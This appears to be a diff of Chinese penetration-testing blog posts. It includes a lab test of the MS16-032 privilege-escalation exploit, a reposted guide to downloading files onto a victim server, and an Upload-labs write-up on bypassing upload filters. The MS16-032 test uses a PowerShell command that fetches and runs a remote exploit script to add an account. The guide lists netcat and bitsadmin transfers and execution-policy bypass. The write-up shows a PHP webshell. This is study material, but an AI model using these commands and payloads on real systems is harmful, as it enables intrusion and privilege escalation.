-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa E:\MS16-032\Windows6.1-KB3139914-x64.msu</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-6.png" alt="6"></p>
-<p>补丁安装完成需要<code>重启计算机才能生效</code>。重启完之后，看一下补丁的安装情况。可以看到<code>KB3139914</code>已经安装了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB3139914</span><br><span class="line">                  [04]: KB958488</span><br><span class="line">                  [05]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>当前系统存在的用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<p>执行<code>MS16-032（CVE-2016-0099）</code>的脚本，可以参考之前这篇文章：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[!] No valid thread handles were captured, exiting!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了</p>
-<h1 id="补丁卸载"><a href="#补丁卸载" class="headerlink" title="补丁卸载"></a>补丁卸载</h1><p>命令行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa /uninstall /kb:3139914</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-7.png" alt="7"></p>
-<p>卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了<code>KB3139914</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB958488</span><br><span class="line">                  [04]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>试一下执行<code>MS16-032（CVE-2016-0099）</code>的脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>脚本又能执行成功了，说明我们成功卸载补丁</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
-<p>如果Powershell禁止执行了，使用如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
-<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
-<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
-<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
-<p>复制</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
-<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
-<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
-<p>target执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
-<p><strong>Netcat补充</strong>：</p>
-<p><code>传输文件</code></p>
-<p>方法一：</p>
-<p>接收端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p>传送端，发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>方法二：</p>
-<p>发送端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>接收端，连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p><code>传送目录</code></p>
-<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
-<p>接收端，先监听并准备解压缩</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
-<p>发送端，压缩并发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
-<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
-<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
-<li><ol>
-<li>打开记事本</li>
-</ol>
-</li>
-<li><ol>
-<li>文件，打开</li>
-</ol>
-</li>
-<li><ol>
-<li>在文件名处填入下载地址</li>
-</ol>
-</li>
-</ul>
-<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
         </p>
       
 
@@ -1289,117 +1363,6 @@
 
 
   
-    <article id="post-Upload-labs 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>本关介绍两种解题方法：</p>
-<p><strong>方法一</strong></p>
-<p>直接上传<code>webshell.php</code>时，发现前端弹出警告。按<code>F12</code>查看，在<code>javascript</code>的<code>白名单</code>中添加<code>php</code>这个后缀，然后就可以直接上传成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-1.png" alt="1-1"></p>
-<p><strong>方法二</strong></p>
-<p>先将webshell的后缀改为<code>png（或者白名单中任意后缀）</code>，然后上传，<code>Burpsuit</code>将数据包进行修改，重新将文件后缀改为<code>.php</code>，绕过前端验证就可以</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-2.png" alt="1-2"></p>
-<p><strong>核心代码</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>直接上传<code>.php</code>文件会提示<code>文件类型不正确，请重新上传！</code>。将文件后缀改为<code>.png</code>，抓包修改文件后缀为<code>.php</code></p>
-<p><img src alt="2-1"></p>
-<p>直接上传成功，蚁剑连接成功</p>
-<p><strong>核心代码</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>直接上传<code>.php</code>文件会提示<code>不允许上传.asp,.aspx,.php,.jsp后缀文件！</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀，还是出现同样的提示</p>
-<p>按照提示来看，应该是采用黑名单，那就用<code>.php3</code>试着绕过，发现上传成功（<code>php3</code>、<code>php5</code>、<code>phtml</code>）</p>
-<p><img src alt="3-1"></p>
-<p>但是这些后缀名我的蚁剑都不能连接，一句话内容更改为<code>代码执行</code>的命令时，也只有<code>phtml</code>能被解析</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> system($_GET[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src alt="3-2"></p>
-<p><strong>核心代码</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span 